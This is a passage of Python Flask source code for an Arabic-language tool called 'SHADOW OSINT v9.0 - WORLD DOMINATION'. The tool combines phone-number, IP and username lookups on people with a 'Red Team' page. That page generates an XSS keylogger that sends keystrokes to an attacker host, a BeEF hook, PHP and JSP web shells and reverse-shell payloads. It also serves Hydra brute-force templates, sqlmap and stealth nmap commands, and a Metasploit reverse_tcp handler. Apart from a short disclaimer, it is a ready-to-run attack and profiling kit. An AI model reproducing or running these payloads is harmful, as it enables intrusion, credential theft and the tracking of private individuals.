        "xss_keylogger": '<script>document.onkeypress=function(e){{new Image().src="{LHOST}/k?k="+String.fromCharCode(e.which)}}</script>',
        "beef_hook": '<script src="{LHOST}:3000/hook.js"></script>',
        "web_shell": '<?php echo "<pre>";system($_GET["cmd"]);echo "</pre>";?>',
        "jsp_shell": '<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=r.readLine())!=null)out.println(l);%>',
    }
    
    @classmethod
    def generate(cls, typ, lhost, lport):
        payload = cls.PAYLOADS.get(typ, cls.PAYLOADS["python"])
        return payload.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
    
    @classmethod
    def nmap_commands(cls):
        return {
            "quick": "nmap -T4 -F {target}",
            "full": "nmap -sS -sV -O -p- {target}",
            "vuln": "nmap --script vuln {target}",
            "stealth": "nmap -sS -Pn -T2 -f {target}",
            "aggressive": "nmap -A -T4 {target}",
            "all_ports": "nmap -p- {target}",
            "os_detect": "nmap -O {target}",
            "service": "nmap -sV --version-intensity 9 {target}",
            "scripts": "nmap -sC {target}",
            "udp": "nmap -sU {target}",
        }
    
    @classmethod
    def sqlmap_command(cls, target):
        return f"sqlmap -u '{target}' --batch --random-agent --dbs --level=3 --risk=2 --threads=10"
    
    @classmethod
    def hydra_commands(cls):
        return {
            "ssh": "hydra -l {user} -P {wordlist} ssh://{target}",
            "ftp": "hydra -l {user} -P {wordlist} ftp://{target}",
            "http": "hydra -l {user} -P {wordlist} http-post-form://{target}",
            "mysql": "hydra -l {user} -P {wordlist} mysql://{target}",
            "rdp": "hydra -l {user} -P {wordlist} rdp://{target}",
            "smb": "hydra -l {user} -P {wordlist} smb://{target}",
        }
    
    @classmethod
    def metasploit_rc(cls, lhost, lport, payload="windows/meterpreter/reverse_tcp"):
        return f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z"""

# ==================== Initialize Scanners ====================
phone_intel = PhoneIntel()
ip_intel = IPIntel()
vuln_scanner = VulnScanner()
username_intel = UsernameIntel()

# ==================== HTML Template ====================
HTML = r'''<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 SHADOW OSINT v9.0 - WORLD DOMINATION</title>
    <style>
        :root{--bg:#020208;--s1:#0a0a15;--s2:#121225;--p1:#ff1744;--p2:#ff5252;--a1:#00e5ff;--t1:#eee;--t2:#888;--b1:#1a1a35;--g1:#00e676;--r1:#ff1744;--y1:#ffea00;--o1:#ff9100;--pu1:#d500f9;--c1:#00e5ff}
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;line-height:1.7}
        body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 20% 30%,rgba(255,23,68,0.04)0%,transparent 50%),radial-gradient(circle at 80% 70%,rgba(0,229,255,0.04)0%,transparent 50%),radial-gradient(circle at 50% 50%,rgba(213,0,249,0.03)0%,transparent 50%);z-index:0;pointer-events:none}
        .container{max-width:1200px;margin:0 auto;padding:15px;position:relative;z-index:1}
        .header{text-align:center;padding:30px 15px;background:linear-gradient(180deg,#1a1a35,#0d0d25);border-bottom:3px solid var(--p1);position:relative;overflow:hidden}
        .header::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,0.008)2px,rgba(255,255,255,0.008)4px)}
        .header h1{font-size:3em;color:var(--p1);text-shadow:0 0 50px rgba(255,23,68,0.6);position:relative;z-index:1;letter-spacing:4px}
        .nav{display:flex;justify-content:center;gap:3px;padding:10px;flex-wrap:wrap;background:var(--s1);position:sticky;top:0;z-index:999;border-bottom:1px solid var(--b1);box-shadow:0 4px 20px rgba(0,0,0,0.5)}
        .nav a{padding:9px 14px;background:var(--s2);color:var(--t1);text-decoration:none;border-radius:6px;border:1px solid var(--b1);font-size:12px;font-weight:500;transition:all 0.25s;white-space:nowrap}
        .nav a:hover{background:var(--p1);color:#fff;border-color:var(--p1);transform:translateY(-1px);box-shadow:0 6px 20px rgba(255,23,68,0.3)}
        .nav a.active{background:var(--p1);color:#fff;border-color:var(--p1)}
        .card{background:var(--s1);border:1px solid var(--b1);border-radius:14px;padding:25px;margin:20px 0;box-shadow:0 8px 25px rgba(0,0,0,0.4)}
        .card:hover{border-color:var(--p1)}
        .card h2{color:var(--p1);margin-bottom:18px;font-size:1.4em}
        .card h3{color:var(--t1);margin:12px 0 8px;font-size:1.1em}
        .card p{color:var(--t2);margin-bottom:12px;font-size:13px}
        .input-row{display:flex;gap:8px;margin-bottom:12px}
        input,select,textarea{flex:1;padding:12px 15px;background:var(--bg);border:2px solid var(--b1);border-radius:8px;color:var(--t1);font-size:14px;font-family:inherit;transition:all 0.3s}
        input:focus,select:focus,textarea:focus{outline:none;border-color:var(--p1);box-shadow:0 0 0 3px rgba(255,23,68,0.08)}
        .btn{padding:12px 28px;background:var(--p1);color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;transition:all 0.3s;white-space:nowrap}
        .btn:hover{background:var(--p2);transform:translateY(-1px);box-shadow:0 8px 25px rgba(255,23,68,0.4)}
        .btn:disabled{opacity:0.5;cursor:not-allowed}
        .btn-outline{background:transparent;border:2px solid var(--p1);color:var(--p1)}
        .btn-outline:hover{background:var(--p1);color:#fff}
        .result-box{background:var(--bg);border:2px solid var(--b1);border-radius:10px;padding:18px;margin-top:15px;display:none;font-family:'Fira Code',monospace;font-size:12px;white-space:pre-wrap;word-wrap:break-word;max-height:500px;overflow-y:auto;line-height:1.5}
        .result-box.show{display:block}
        .result-box.success{border-color:var(--g1)}
        .result-box.error{border-color:var(--r1)}
        .loading{text-align:center;padding:15px;display:none}
        .loading.show{display:block}
        .spinner{width:40px;height:40px;border:3px solid var(--b1);border-top:3px solid var(--p1);border-radius:50%;animation:spin 0.7s linear infinite;margin:0 auto 10px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .badge{display:inline-block;padding:4px 10px;border-radius:5px;font-weight:600;font-size:11px;margin:2px}
        .badge-success{background:var(--g1);color:#000}
        .badge-danger{background:var(--r1);color:#fff}
        .badge-warning{background:var(--y1);color:#000}
        .badge-info{background:var(--a1);color:#000}
        .badge-purple{background:var(--pu1);color:#fff}
        .badge-critical{background:#b71c1c;color:#fff;padding:6px 14px;font-size:13px}
        table{width:100%;border-collapse:collapse;margin:10px 0}
        th,td{padding:10px;border:1px solid var(--b1);text-align:right;font-size:12px}
        th{background:var(--s2);color:var(--p1);font-weight:600}
        td{background:var(--bg)}
        tr:hover td{background:#0d0d1a}
        .grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:8px}
        .grid-item{background:var(--s2);padding:8px 12px;border-radius:6px;border:1px solid var(--b1);font-size:12px}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin:15px 0}
        .stat-card{background:var(--s2);border:1px solid var(--b1);border-radius:10px;padding:20px;text-align:center}
        .stat-card:hover{border-color:var(--p1);transform:translateY(-2px)}
        .stat-card .value{font-size:2.2em;font-weight:bold;color:var(--p1)}
        .stat-card .label{color:var(--t2);font-size:11px;text-transform:uppercase;letter-spacing:1px}
        code{background:#111;padding:2px 7px;border-radius:3px;color:var(--p1);font-family:'Fira Code',monospace;font-size:12px}
        pre{background:var(--bg);padding:12px;border-radius:8px;overflow-x:auto;border:1px solid var(--b1);font-size:12px;color:var(--g1)}
        .footer{text-align:center;padding:20px;color:var(--t2);border-top:1px solid var(--b1);margin-top:30px;font-size:12px}
        ::-webkit-scrollbar{width:5px}
        ::-webkit-scrollbar-track{background:var(--bg)}
        ::-webkit-scrollbar-thumb{background:var(--b1);border-radius:3px}
        ::-webkit-scrollbar-thumb:hover{background:var(--p1)}
        @media(max-width:768px){.header h1{font-size:2em}.input-row{flex-direction:column}.nav{flex-direction:column}.nav a{text-align:center}}
    </style>
</head>
<body>
    <div class="header"><h1>🔥 SHADOW OSINT</h1><p style="color:#999;position:relative;z-index:1">WORLD DOMINATION v9.0</p><span style="display:inline-block;background:var(--p1);color:#fff;padding:4px 14px;border-radius:20px;font-size:11px;position:relative;z-index:1">v9.0 FINAL</span></div>
    <div class="nav">
        <a href="/" class="{{a_phone}}">📱 هاتف</a>
        <a href="/ip" class="{{a_ip}}">🌐 IP</a>
        <a href="/url" class="{{a_url}}">🔗 ثغرات</a>
        <a href="/username" class="{{a_user}}">👤 يوزر</a>
        <a href="/redteam" class="{{a_red}}">💀 Red Team</a>
        <a href="/payloads" class="{{a_pay}}">🧨 Payloads</a>
        <a href="/api" class="{{a_api}}">⚡ API</a>
        <a href="/stats" class="{{a_stats}}">📊 إحصائيات</a>
    </div>
    <div class="container">{{content|safe}}</div>
    <div class="footer"><p>⚠️ للأغراض التعليمية والبحثية فقط. المستخدم يتحمل المسؤولية القانونية الكاملة.</p><p>SHADOW OSINT v9.0 WORLD DOMINATION</p></div>
    <script>
        async function scan(t){
            const i=document.getElementById(t+'-input'),l=document.getElementById(t+'-loading'),r=document.getElementById(t+'-result');
            if(!i||!i.value.trim()){alert('أدخل '+t);return}
            l.classList.add('show');r.classList.remove('show','success','error');r.innerHTML='';
            try{
                const b={};b[t]=i.value.trim();
                const resp=await fetch('/api/scan/'+t,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});
                const d=await resp.json();
                r.innerHTML=format(t,d);r.classList.add(resp.ok?'success':'error');r.classList.add('show');
                r.scrollIntoView({behavior:'smooth'});
            }catch(e){r.innerHTML='<span style="color:#f44">❌ '+e.message+'</span>';r.classList.add('error','show')}
            l.classList.remove('show');
        }
        function badge(v,t,f){if(v===true)return'<span class="badge badge-success">✅ '+t+'</span>';if(v===false)return'<span class="badge badge-danger">❌ '+f+'</span>';return'<span class="badge badge-warning">⚠️ ؟</span>'}
        function format(t,d){
            let h='';
            if(t==='phone'){
                h+='<h3 style="color:#ff1744">📱 '+d.phone+'</h3><div class="grid-2">';
                const p=d.platforms||{};
                for(const[n,v]of Object.entries(p)){
                    const e=v&&(v.exists||v.linked||v.found);
                    h+='<div class="grid-item"><b>'+n+'</b>: '+badge(e,'موجود','غير موجود')+'</div>';
                }
                h+='</div>';
                if(p.truecaller&&p.truecaller.name)h+='<br><b>👤 Truecaller:</b> <span style="color:#d500f9;font-size:16px">'+p.truecaller.name+'</span>';
                if(p.carrier&&!p.carrier.error)h+='<br><b>📶:</b> '+p.carrier.carrier+' | '+p.carrier.country;
            }else if(t==='ip'){
                h+='<h3 style="color:#ff1744">🌐 '+d.ip+'</h3>';
                const g=d.geoip||{};if(g.country)h+='<b>📍</b> '+(g.city||'')+', '+g.country+'<br>';
                const a=d.abuse||{};if(a.score!==undefined)h+='<b>⚠️ Abuse:</b> <span class="badge '+(a.score>50?'badge-danger':'badge-success')+'">'+a.score+'%</span> ('+a.reports+')<br>';
                const po=d.ports||{};if(po.open&&po.open.length>0){h+='<b>🔓:</b> ';po.open.forEach(x=>{h+='<span class="badge badge-warning">'+x.port+' ('+x.service+')</span> '});}
                if(d.dns)h+='<br><b>DNS:</b> '+d.dns;
            }else if(t==='url'){
                h+='<h3 style="color:#ff1744">🔗 '+d.url+'</h3>';
                const vulns=d.vulnerabilities||[];if(vulns.length>0){h+='<b>⚠️ ثغرات ('+vulns.length+'):</b><br>';vulns.forEach(x=>{h+='<div style="margin:3px 0;padding:6px;background:#0d0d1a;border-radius:4px"><span class="badge badge-critical">'+x.severity+'</span> <b>'+x.type+'</b>: '+x.description+'</div>';})}
                const ssl=d.ssl||{};if(ssl.days_left!==undefined)h+='<br><b>🔒 SSL:</b> '+ssl.days_left+' يوم';
                const vt=d.virustotal||{};if(vt.malicious!==undefined)h+='<br><b>🦠 VT:</b> ضار:'+vt.malicious+' آمن:'+vt.harmless;
            }else if(t==='username'){
                h+='<h3 style="color:#ff1744">👤 @'+d.username+'</h3><b>موجود في '+d.found_count+'/'+d.total_checked+' منصة</b><br><br><div class="grid-2">';
                for(const[n,f]of Object.entries(d.platforms||{}))h+='<div class="grid-item">'+n+': '+badge(f,'✅','❌')+'</div>';
                h+='</div>';
            }
            return h;
        }
        document.addEventListener('keypress',e=>{if(e.key==='Enter'){const a=document.activeElement;if(a&&a.id&&a.id.endsWith('-input'))scan(a.id.replace('-input',''));}});
        async function genPayload(){const t=document.getElementById('ptype').value,l=document.getElementById('lhost').value||'LHOST',p=document.getElementById('lport').value||'4444',r=document.getElementById('payload-result');try{const resp=await fetch('/api/redteam/payload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:t,lhost:l,lport:p})});const d=await resp.json();r.innerHTML='<pre><code>'+d.payload+'</code></pre>';r.classList.add('show')}catch(e){r.innerHTML='خطأ: '+e.message;r.classList.add('show')}}
    </script>
</body>
</html>'''

# ==================== Pages ====================
def page(active, content):
    acts = {f"a_{p}":"active" if p==active else "" for p in ["phone","ip","url","user","red","pay","api","stats"]}
    h = HTML
    for k,v in acts.items(): h = h.replace("{{"+k+"}}", v)
    return h.replace("{{content|safe}}", content)

PHONE = """<div class="card"><h2>📱 فحص رقم الهاتف الشامل</h2><p>واتساب، تيليجرام، فيسبوك، انستجرام، سناب، تويتر، فايبر، سيجنال، تروكولر، الشبكة، التسريبات...</p><div class="input-row"><input id="phone-input" placeholder="+201234567890" value="+20" autofocus><button class="btn" onclick="scan('phone')">🔍 فحص شامل</button></div><div class="loading" id="phone-loading"><div class="spinner"></div></div><div class="result-box" id="phone-result"></div></div>"""
IP = """<div class="card"><h2>🌐 فحص IP متقدم</h2><p>GeoIP، المنافذ، DNS، AbuseIPDB، Shodan، VPN، TOR، القوائم السوداء...</p><div class="input-row"><input id="ip-input" placeholder="8.8.8.8" autofocus><button class="btn" onclick="scan('ip')">🔍 فحص</button></div><div class="loading" id="ip-loading"><div class="spinner"></div></div><div class="result-box" id="ip-result"></div></div>"""
URL = """<div class="card"><h2>🔗 فحص الثغرات الأمنية</h2><p>SSL، رؤوس الأمان، VirusTotal، XSS، SQLi، LFI، SSRF، ملفات مكشوفة...</p><div class="input-row"><input id="url-input" placeholder="https://example.com" autofocus><button class="btn" onclick="scan('url')">🔍 فحص الثغرات</button></div><div class="loading" id="url-loading"><div class="spinner"></div></div><div class="result-box" id="url-result"></div></div>"""
USER = """<div class="card"><h2>👤 فحص اسم المستخدم</h2><p>37+ منصة اجتماعية وتقنية</p><div class="input-row"><input id="username-input" placeholder="username" autofocus><button class="btn" onclick="scan('username')">🔍 بحث</button></div><div class="loading" id="username-loading"><div class="spinner"></div></div><div class="result-box" id="username-result"></div></div>"""
RED = """<div class="card"><h2>💀 Red Team Tools</h2>
<h3>🔨 Payload Generator</h3><div class="input-row">
<select id="ptype"><option value="python">Python</option><option value="bash">Bash</option><option value="nc">Netcat</option><option value="php">PHP</option><option value="powershell">PowerShell</option><option value="xss_cookie">XSS Cookie</option><option value="xss_keylogger">XSS Keylogger</option><option value="beef_hook">BeEF Hook</option><option value="web_shell">Web Shell</option></select>
<input id="lhost" placeholder="LHOST"><input id="lport" placeholder="4444"><button class="btn" onclick="genPayload()">⚡ توليد</button></div>
<div class="result-box" id="payload-result"></div>
<h3>🔍 Nmap</h3><pre><code>nmap -sS -sV -O -p- TARGET
nmap --script vuln TARGET
nmap -sS -Pn -T2 -f TARGET</code></pre>
<h3>💉 SQLMap</h3><pre><code>sqlmap -u 'URL' --batch --random-agent --dbs</code></pre>
<h3>🔨 Hydra</h3><pre><code>hydra -l USER -P wordlist.txt ssh://TARGET</code></pre>
<h3>📡 Metasploit</h3><pre><code>use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
exploit -j -z</code></pre></div>"""
API = """<div class="card"><h2>⚡ API</h2><pre><code>POST /api/scan/phone     {"phone":"+2012..."}
POST /api/scan/ip        {"ip":"8.8.8.8"}
POST /api/scan/url       {"url":"https://..."}
POST /api/scan/username  {"username":"user"}
POST /api/redteam/payload {"type":"python","lhost":"IP","lport":"4444"}
GET  /api/stats
GET  /api/payloads</code></pre></div>"""

# ==================== Routes ====================
@web_app.route('/')
def home(): return page('phone', PHONE)

@web_app.route('/ip')
def ip(): return page('ip', IP)

@web_app.route('/url')
def url(): return page('url', URL)

@web_app.route('/username')
def username(): return page('user', USER)

@web_app.route('/redteam')
def redteam(): return page('red', RED)

@web_app.route('/payloads')
def payloads():
    pl = db.fetch("SELECT * FROM payloads ORDER BY category, risk_level DESC")
    rows = ""
    for i, p in enumerate(pl):
        sev = "badge-critical" if p['risk_level'] == 'Critical' else "badge-danger" if p['risk_level'] == 'High' else "badge-warning" if p['risk_level'] == 'Medium' else "badge-info"
        rows += f'<tr><td>{i+1}</td><td>{p["category"]}</td><td>{p["name"]}</td><td><span class="badge {sev}">{p["risk_level"]}</span></td><td><code>{p["payload"][:80]}</code></td></tr>'
    content = f'<div class="card"><h2>🧨 Payloads Library ({len(pl)})</h2><table><tr><th>#</th><th>الفئة</th><th>الاسم</th><th>الخطورة</th><th>البيلود</th></tr>{rows}</table></div>'
    return page('pay', content)

@web_app.route('/api')
def api(): return page('api', API)

@web_app.route('/stats')
def stats():
    total = db.fetchone("SELECT COUNT(*) as c FROM scans")['c']
    vulns = db.fetchone("SELECT COUNT(*) as c FROM vulnerabilities")['c']
    content = f"""<div class="card"><h2>📊 إحصائيات</h2><div class="stats-grid">
    <div class="stat-card"><div class="value">{total}</div><div class="label">فحوصات</div></div>
    <div class="stat-card"><div class="value">{vulns}</div><div class="label">ثغرات</div></div></div></div>"""
    return page('stats', content)

# ==================== API ====================
@web_app.route('/api/scan/<typ>', methods=['POST'])
def api_scan(typ):
    try:
        data = request.get_json() or {}
        target = data.get(typ, '')
        if not target: return jsonify({"error":"Missing target"}), 400
        
        scanners = {
            'phone': phone_intel.scan,
            'ip': ip_intel.scan,
            'url': vuln_scanner.scan,
            'username': username_intel.scan
        }
        
        if typ not in scanners: return jsonify({"error":"Unknown"}), 400
        
        result = scanners[typ](target)
        
        # Save scan
        db.execute(
            "INSERT INTO scans (target, scan_type, result, ip_address) VALUES (?,?,?,?)",
            (target, typ, json.dumps(result, ensure_ascii=False), request.remote_addr or '')
        )
        
        return jsonify(result)
    except Exception as e:
        return jsonify({"error":str(e)}), 500

@web_app.route('/api/redteam/payload', methods=['POST'])
def api_payload():
    data = request.get_json() or {}
    payload = RedTeam.generate(
        data.get('type', 'python'),
        data.get('lhost', 'LHOST'),
        data.get('lport', '4444')
    )
    return jsonify({"payload": payload})

@web_app.route('/api/payloads')
def api_payloads():
    return jsonify(db.fetch("SELECT * FROM payloads"))

@web_app.route('/api/stats')
def api_stats():
    return jsonify({
        "total_scans": db.fetchone("SELECT COUNT(*) as c FROM scans")['c'],
        "version": "9.0",
        "codename": "WORLD DOMINATION"
    })

@web_app.route('/health')
def health():
    return jsonify({"status":"healthy","version":"9.0"})

@web_app.errorhandler(404)
def e404(e): return jsonify({"error":"Not found"}), 404

@web_app.errorhandler(500)
def e500(e): return jsonify({"error":"Internal error"}), 500

# ==================== RUN ====================
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════════════════════════════════╗
║      🔥 SHADOW OSINT v9.0 - WORLD DOMINATION 🔥                ║
║  OSINT + Red Team + Pentest + Payloads + Vuln Scanner          ║
║            المستخدم يتحمل المسؤولية القانونية كاملة               ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    print(f"🚀 http://0.0.0.0:{PORT}")
    web_app.run(host='0.0.0.0', port=PORT, debug=False)
